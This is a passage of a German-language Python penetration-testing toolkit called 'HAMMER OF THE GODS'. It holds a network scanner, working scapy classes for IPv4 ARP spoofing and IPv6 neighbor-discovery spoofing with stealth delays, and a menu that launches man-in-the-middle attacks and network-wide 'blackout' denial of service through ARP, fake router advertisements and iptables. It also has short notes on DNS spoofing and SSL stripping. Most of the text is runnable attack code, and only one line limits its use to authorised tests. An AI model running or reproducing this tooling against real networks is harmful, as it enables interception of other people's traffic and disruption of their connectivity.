        logger.log("INFO", "Service-Scan gestartet...")
        nm = nmap.PortScanner()
        for ip_, info in discovered.items():
            if info["reachable"]:
                try:
                    nm.scan(ip_, arguments="-sV -Pn")
                    if ip_ in nm.all_hosts() and 'tcp' in nm[ip_]:
                        ports = []
                        for port in sorted(nm[ip_]['tcp']):
                            port_info = nm[ip_]['tcp'][port]
                            service = port_info.get('name', '')
                            state = port_info.get('state', '')
                            ports.append(f"{port}/{state} ({service})")
                        info["ports"] = ", ".join(ports) if ports else "Keine offenen Ports"
                except Exception as e:
                    logger.log("ERROR", f"Fehler beim Service-Scan {ip_}: {e}")
    result_list = []
    for ip_, info in discovered.items():
        result_list.append({
            "ip": ip_,
            "mac": info.get("mac", "??:??:??:??:??:??"),
            "vendor": info.get("vendor", "Unbekannter Hersteller"),
            "reachable": "Erreichbar" if info.get("reachable") else "Keine Antwort",
            "os": info.get("os") or "N/A",
            "name": info.get("name") or "N/A",
            "ports": info.get("ports", "N/A")
        })
    result_list.sort(key=lambda x: ipaddress.ip_address(x["ip"]))
    logger.log("INFO", f"Scan abgeschlossen, {len(result_list)} Geräte gefunden.")
    return discovered

######################################################################
#              ARP-SPOOFING (IPv4)
######################################################################

class ARPSpoofer:
    def __init__(self, target_ip, target_mac, gateway_ip, gateway_mac, iface, logger):
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.iface = iface
        self.logger = logger
        self.stop_event = threading.Event()
        self.packet_count_target = 0
        self.packet_count_gateway = 0
        self.lock = threading.Lock()
    def spoof_target(self):
        from scapy.all import Ether, ARP, sendp
        ether = Ether(dst=self.target_mac)
        arp = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
        pkt = ether / arp
        self.logger.log("INFO", f"Starte ARP-Spoofing (Ziel: {self.target_ip}).")
        while not self.stop_event.is_set():
            try:
                sendp(pkt, iface=self.iface, verbose=0)
            except Exception as e:
                self.logger.log("ERROR", f"Fehler beim Senden von ARP-Paket an Ziel: {e}")
            with self.lock:
                self.packet_count_target += 1
            time.sleep(stealth_delay())
    def spoof_gateway(self):
        from scapy.all import Ether, ARP, sendp
        ether = Ether(dst=self.gateway_mac)
        arp = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
        pkt = ether / arp
        self.logger.log("INFO", f"Starte ARP-Spoofing (Gateway: {self.gateway_ip}).")
        while not self.stop_event.is_set():
            try:
                sendp(pkt, iface=self.iface, verbose=0)
            except Exception as e:
                self.logger.log("ERROR", f"Fehler beim Senden von ARP-Paket an Gateway: {e}")
            with self.lock:
                self.packet_count_gateway += 1
            time.sleep(stealth_delay())
    def log_status(self):
        while not self.stop_event.is_set():
            time.sleep(5)
            with self.lock:
                self.logger.log("STATS", f"ARP-Pakete -> Ziel: {self.packet_count_target}, Gateway: {self.packet_count_gateway}")
    def restore(self):
        own = get_own_mac(self.iface, self.logger)
        if not own:
            self.logger.log("WARNING", "Eigene MAC unbekannt. Manuelle Wiederherstellung nötig.")
            return
        self.logger.log("INFO", "Stelle ARP-Tabellen wieder her...")
        from scapy.all import Ether, ARP, sendp
        e_t = Ether(dst=self.target_mac)
        a_t = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        sendp(e_t/a_t, count=5, iface=self.iface, verbose=0)
        e_g = Ether(dst=self.gateway_mac)
        a_g = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
        sendp(e_g/a_g, count=5, iface=self.iface, verbose=0)
        self.logger.log("INFO", "ARP-Tabellen wiederhergestellt.")

######################################################################
#               IPv6 ND-SPOOFING (ICMPv6)
######################################################################

class NDspoofer:
    def __init__(self, target_ipv6, target_mac, gateway_ipv6, gateway_mac, iface, logger):
        self.target_ipv6 = target_ipv6
        self.target_mac = target_mac
        self.gateway_ipv6 = gateway_ipv6
        self.gateway_mac = gateway_mac
        self.iface = iface
        self.logger = logger
        self.stop_event = threading.Event()
        self.packet_count_target = 0
        self.packet_count_gateway = 0
        self.lock = threading.Lock()
    def spoof_target(self):
        from scapy.all import Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, sendp
        own_mac = get_own_mac(self.iface, self.logger)
        if not own_mac:
            self.logger.log("ERROR", "Keine eigene MAC – Abbruch ND-Spoofing (Target).")
            return
        self.logger.log("INFO", f"Starte ND-Spoofing (Ziel: {self.target_ipv6}).")
        while not self.stop_event.is_set():
            try:
                na = IPv6(dst=self.target_ipv6, src=self.gateway_ipv6) / ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.gateway_ipv6) / ICMPv6NDOptDstLLAddr(lladdr=own_mac)
                sendp(Ether(dst=self.target_mac)/na, iface=self.iface, verbose=0)
            except Exception as e:
                self.logger.log("ERROR", f"Fehler beim Senden ND-Paket an Ziel: {e}")
            with self.lock:
                self.packet_count_target += 1
            time.sleep(stealth_delay())
    def spoof_gateway(self):
        from scapy.all import Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, sendp
        own_mac = get_own_mac(self.iface, self.logger)
        if not own_mac:
            self.logger.log("ERROR", "Keine eigene MAC – Abbruch ND-Spoofing (Gateway).")
            return
        self.logger.log("INFO", f"Starte ND-Spoofing (Gateway: {self.gateway_ipv6}).")
        while not self.stop_event.is_set():
            try:
                na = IPv6(dst=self.gateway_ipv6, src=self.target_ipv6) / ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.target_ipv6) / ICMPv6NDOptDstLLAddr(lladdr=own_mac)
                sendp(Ether(dst=self.gateway_mac)/na, iface=self.iface, verbose=0)
            except Exception as e:
                self.logger.log("ERROR", f"Fehler beim Senden ND-Paket an Gateway: {e}")
            with self.lock:
                self.packet_count_gateway += 1
            time.sleep(stealth_delay())
    def log_status(self):
        while not self.stop_event.is_set():
            time.sleep(5)
            with self.lock:
                self.logger.log("STATS", f"ND-Pakete -> Ziel: {self.packet_count_target}, Gateway: {self.packet_count_gateway}")
    def restore(self):
        self.logger.log("INFO", "Stelle IPv6 ND-Tabellen wieder her...")
        own_mac = get_own_mac(self.iface, self.logger)
        if not own_mac:
            self.logger.log("WARNING", "Eigene MAC unbekannt. ND-Restore manuell nötig.")
            return
        from scapy.all import Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, sendp
        na_target = (Ether(dst=self.target_mac)/
                     IPv6(dst=self.target_ipv6, src=self.gateway_ipv6)/
                     ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.gateway_ipv6)/
                     ICMPv6NDOptDstLLAddr(lladdr=self.gateway_mac))
        sendp(na_target, count=5, iface=self.iface, verbose=0)
        na_gw = (Ether(dst=self.gateway_mac)/
                 IPv6(dst=self.gateway_ipv6, src=self.target_ipv6)/
                 ICMPv6ND_NA(R=0, S=1, O=1, tgt=self.target_ipv6)/
                 ICMPv6NDOptDstLLAddr(lladdr=self.target_mac))
        sendp(na_gw, count=5, iface=self.iface, verbose=0)
        self.logger.log("INFO", "IPv6 ND-Tabellen wiederhergestellt.")

######################################################################
#                         HAUPTMENÜ
######################################################################

def main():
    logger = PenTestLogger(log_to_console=True, log_file="hammer_log.csv", log_level="INFO")
    if os.geteuid() != 0:
        logger.log("ERROR", "Bitte als Root starten!")
        sys.exit(1)
    logger.log("INFO", "Willkommen im HAMMER OF THE GODS – Extended Network Toolkit!")
    logger.log("INFO", "Nur in autorisierten Testumgebungen verwenden.")
    ifaces = netifaces.interfaces()
    print("\nVerfügbare Netzwerkschnittstellen:")
    for i, ifc in enumerate(ifaces, start=1):
        print(f"{i}. {ifc}")
    choice = input("Bitte Nummer oder Interface-Namen eingeben: ").strip()
    if choice.isdigit():
        idx = int(choice)
        if 1 <= idx <= len(ifaces):
            iface = ifaces[idx - 1]
        else:
            logger.log("ERROR", "Ungültige Interface-Auswahl.")
            sys.exit(1)
    else:
        if choice in ifaces:
            iface = choice
        else:
            logger.log("WARNING", f"{choice} nicht in Liste, versuche trotzdem.")
            iface = choice

    device_list = {}
    gateway_ip = get_default_gateway(logger)
    while True:
        print("\n========================================")
        print("       HAUPTMENÜ – HAMMER OF THE GODS")
        print("========================================")
        print("1) Netzwerkscan (IPv4) – Kombinierter Scan")
        print("2) Netzwerkscan (IPv6)")
        print("3) Gefundene Geräte anzeigen (tabellarische Ausgabe)")
        print("4) DAI/Port Security/WLAN-Isolation-Test (ARP-basiert)")
        print("5) IPv6 ND-Verkehr sniffen (Erkennung IPv6-Nutzung)")
        print("6) ARP-Spoofing (MITM/Block) für IPv4")
        print("7) IPv6 ND-Spoofing (MITM/Block) für IPv6")
        print("8) Blackout – Gesamter Netzwerkverkehr blockieren (ARP)")
        print("9) Hinweise zu DNS-Spoofing / SSL-Strip / MITM-Techniken")
        print("10) Beenden")
        print("11) Optimierter Netzwerkscan (IPv4, asynchron)")
        print("12) IPv6 Blackout (Fake-Router-Advertisements)")
        print("13) Blackout via iptables (IPv4)")
        menu_choice = input("Auswahl: ").strip()
        
        if menu_choice == "1":
            device_list = scan_network_enhanced(iface, logger)
            print(f"{len(device_list)} Geräte gefunden. Mit Option 3 anzeigen.")
        elif menu_choice == "2":
            ipv6_devices = scan_network_ipv6(iface, logger)
            if ipv6_devices:
                if TABULATE_AVAILABLE:
                    rows = []
                    for dev in ipv6_devices:
                        rows.append([dev["ip"], dev["name"], dev["mac"], dev["vendor"], dev["reachable"], dev["os"], dev["ports"]])
                    headers = ["IPv6-Adresse", "Name", "MAC", "Vendor", "Status", "OS", "Ports"]
                    print("\n\033[95m=== Gefundene IPv6-Geräte im epischen Netzwerk ===\033[0m")
                    print(tabulate(rows, headers=headers, tablefmt="fancy_grid"))
                else:
                    for i, dev in enumerate(ipv6_devices, start=1):
                        print(f"{i}. IP={dev['ip']}, MAC={dev['mac']} ({dev['vendor']}), Name={dev['name']}, OS={dev['os']}, Status={dev['reachable']}, Ports={dev['ports']}")
            else:
                print("Keine IPv6-Geräte gefunden.")
        elif menu_choice == "3":
            if not device_list:
                print("Keine Geräteliste vorhanden. Bitte erst (1) IPv4 Netzwerkscan durchführen.")
                continue
            if TABULATE_AVAILABLE:
                rows = []
                for dev in device_list.values():
                    rows.append([dev["ip"] if "ip" in dev else "N/A", dev["name"], dev["mac"], dev["vendor"], dev["reachable"], dev["os"], dev["ports"]])
                headers = ["IP-Adresse", "Name", "MAC-Adresse", "Vendor", "Status", "OS", "Ports"]
                print("\n\033[95m=== Gefundene Geräte im epischen Netzwerk ===\033[0m")
                print(tabulate(rows, headers=headers, tablefmt="fancy_grid"))
            else:
                for i, dev in enumerate(device_list.values(), start=1):
                    print(f"{i}. IP={dev['ip'] if 'ip' in dev else 'N/A'}, MAC={dev['mac']} ({dev['vendor']}), Name={dev['name']}, OS={dev['os']}, Status={dev['reachable']}, Ports={dev['ports']}")
        elif menu_choice == "4":
            detect_arp_security_mechanisms(iface, logger, duration=10)
            print("\nHinweis: Keine ARP-Antworten -> Möglicherweise WLAN-Isolation aktiv.")
        elif menu_choice == "5":
            detect_ipv6_neighbors(iface, logger, duration=10)
        elif menu_choice == "6":
            if not gateway_ip:
                gateway_ip = input("Keine IPv4-Gateway-IP erkannt. Bitte eingeben: ").strip()
                if not validate_ip(gateway_ip):
                    logger.log("ERROR", "Ungültige IP-Adresse für Gateway.")
                    continue
            target_ip = input("Ziel-IP (IPv4) eingeben: ").strip()
            if not validate_ip(target_ip):
                logger.log("ERROR", "Ungültige IP-Adresse für Ziel.")
                continue
            # Versuch, die Ziel-MAC automatisch zu ermitteln
            auto_target_mac = get_mac_via_arp(iface, target_ip, logger)
            if auto_target_mac:
                target_mac = auto_target_mac
                logger.log("INFO", f"Automatisch ermittelte Ziel-MAC: {target_mac}")
            else:
                target_mac = input("MAC-Adresse des Ziels eingeben: ").strip()
                if not validate_mac(target_mac):
                    logger.log("ERROR", "Ungültiges MAC-Format für Ziel-MAC.")
                    continue
            logger.log("INFO", f"Ermittle Gateway-MAC via ARP-Request an {gateway_ip}...")
            from scapy.all import Ether, ARP, srp
            eth = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_req = ARP(pdst=gateway_ip)
            ans, _ = srp(eth/arp_req, iface=iface, timeout=3, verbose=0)
            gw_mac_detected = None
            for _, r in ans:
                gw_mac_detected = r.hwsrc
                break
            if gw_mac_detected:
                gateway_mac = gw_mac_detected
                logger.log("INFO", f"Gateway MAC: {gateway_mac}")
            else:
                gateway_mac = input("Gateway MAC nicht gefunden, bitte manuell eingeben: ").strip()
                if not validate_mac(gateway_mac):
                    logger.log("ERROR", "Ungültiges MAC-Format für Gateway-MAC.")
                    continue
            print("\n(1) Unidirektionales Spoofing (nur Ziel manipulieren)")
            print("(2) Bidirektionales Spoofing (MITM)")
            mode_choice = input("Wahl (1/2): ").strip()
            ipf = (input("IP-Forwarding aktivieren? (j/n): ").lower() == "j")
            if ipf:
                enable_ip_forward(logger)
            block_ = (input("Zielverkehr mit iptables blockieren? (j/n): ").lower() == "j")
            if block_:
                block_target_traffic(target_ip, logger, "FORWARD", None)
            spoofer = ARPSpoofer(target_ip, target_mac, gateway_ip, gateway_mac, iface, logger)
            with ThreadPoolExecutor(max_workers=3) as executor:
                if mode_choice == "1":
                    executor.submit(spoofer.spoof_target)
                    logger.log("INFO", f"Unidirektionales ARP-Spoofing gestartet (Ziel: {target_ip}).")
                elif mode_choice == "2":
                    executor.submit(spoofer.spoof_target)
                    executor.submit(spoofer.spoof_gateway)
                    logger.log("INFO", f"Bidirektionales ARP-Spoofing (MITM) gestartet: {target_ip} <-> {gateway_ip}")
                else:
                    logger.log("ERROR", "Ungültige Auswahl. Abbruch.")
                    continue
                executor.submit(spoofer.log_status)
                executor.submit(monitor_target, target_ip, spoofer.stop_event, logger, 5)
                print("\nARP-Spoofing läuft. STRG+C zum Beenden...\n")
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    logger.log("INFO", "Spoofing beendet per STRG+C.")
                    spoofer.stop_event.set()
                    executor.shutdown(wait=True)
                    spoofer.restore()
                    if block_:
                        unblock_target_traffic(target_ip, logger, "FORWARD", None)
                    if ipf:
                        disable_ip_forward(logger)
        elif menu_choice == "7":
            if not gateway_ip:
                gateway_ipv6 = input("Bitte Gateway-IP (IPv6) manuell eingeben: ").strip()
                if not validate_ip(gateway_ipv6):
                    logger.log("ERROR", "Ungültige IPv6-Adresse für Gateway.")
                    continue
            else:
                gateway_ipv6 = input("IPv6-Gateway-Adresse: ").strip()
                if not validate_ip(gateway_ipv6):
                    logger.log("ERROR", "Ungültige IPv6-Adresse für Gateway.")
                    continue
            target_ipv6 = input("Ziel-IP (IPv6) eingeben: ").strip()
            if not validate_ip(target_ipv6):
                logger.log("ERROR", "Ungültige IPv6-Adresse für Ziel.")
                continue
            target_mac = input("MAC-Adresse des Ziels: ").strip()
            if not validate_mac(target_mac):
                logger.log("ERROR", "Ungültiges MAC-Format für Ziel-MAC.")
                continue
            gateway_mac = input("MAC-Adresse des IPv6-Gateways: ").strip()
            if not validate_mac(gateway_mac):
                logger.log("ERROR", "Ungültiges MAC-Format für Gateway-MAC.")
                continue
            ipf = (input("IP-Forwarding aktivieren? (j/n): ").lower() == "j")
            if ipf:
                enable_ip_forward(logger)
            block_ = (input("Zielverkehr mit ip6tables blockieren? (j/n): ").lower() == "j")
            if block_:
                block_target_traffic(target_ipv6, logger, "FORWARD", None)
            ndsp = NDspoofer(target_ipv6, target_mac, gateway_ipv6, gateway_mac, iface, logger)
            print("\n(1) Unidirektional (nur Ziel täuschen)")
            print("(2) Bidirektional (MITM: Ziel & Gateway)")
            mode_choice = input("Wahl (1/2): ").strip()
            with ThreadPoolExecutor(max_workers=3) as executor:
                if mode_choice == "1":
                    executor.submit(ndsp.spoof_target)
                    logger.log("INFO", f"Unidirektionales ND-Spoofing gestartet (Ziel: {target_ipv6}).")
                elif mode_choice == "2":
                    executor.submit(ndsp.spoof_target)
                    executor.submit(ndsp.spoof_gateway)
                    logger.log("INFO", f"Bidirektionales ND-Spoofing (MITM) gestartet: {target_ipv6} <-> {gateway_ipv6}")
                else:
                    logger.log("ERROR", "Ungültige Auswahl. Abbruch.")
                    continue
                executor.submit(ndsp.log_status)
                executor.submit(monitor_target, target_ipv6, ndsp.stop_event, logger, 5)
                print("\nIPv6 ND-Spoofing läuft. STRG+C zum Beenden...\n")
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    logger.log("INFO", "ND-Spoofing beendet per STRG+C.")
                    ndsp.stop_event.set()
                    executor.shutdown(wait=True)
                    ndsp.restore()
                    if block_:
                        unblock_target_traffic(target_ipv6, logger, "FORWARD", None)
                    if ipf:
                        disable_ip_forward(logger)
        elif menu_choice == "8":
            print("\nStarte Blackout-Modus – alle Geräte werden blockiert (ARP).")
            blackout(iface, logger)
        elif menu_choice == "9":
            print("\nDNS-Spoofing, SSL-Strip & weitere MITM-Techniken:")
            print("-------------------------------------------------")
            print("1) DNS-Spoofing: DNS-Anfragen abfangen & manipulieren, um Traffic umzuleiten.")
            print("2) SSL-Strip: HTTPS auf HTTP downgraden (ohne HSTS).")
            print("3) DHCP-Spoofing, Rogue-AP, Switch Attacks – alles nur autorisiert!")
        elif menu_choice == "10":
            print("Beende Programm. Auf Wiedersehen!")
            sys.exit(0)
        elif menu_choice == "11":
            logger.log("INFO", "Starte optimierten, asynchronen IPv4-Netzwerkscan...")
            try:
                device_list = asyncio.run(async_scan_network_optimized(iface, logger))
                print(f"{len(device_list)} Geräte gefunden (asynchron).")
            except Exception as e:
                logger.log("ERROR", f"Fehler beim asynchronen Scan: {e}")
        elif menu_choice == "12":
            logger.log("INFO", "Starte IPv6 Blackout (Fake RA)...")
            ipv6_blackout(iface, logger)
        elif menu_choice == "13":
            logger.log("INFO", "Aktiviere Blackout via iptables (IPv4)...")
            blackout_iptables(logger)
        else:
            print("Ungültige Auswahl. Bitte erneut versuchen.")

if __name__ == "__main__":
    main()
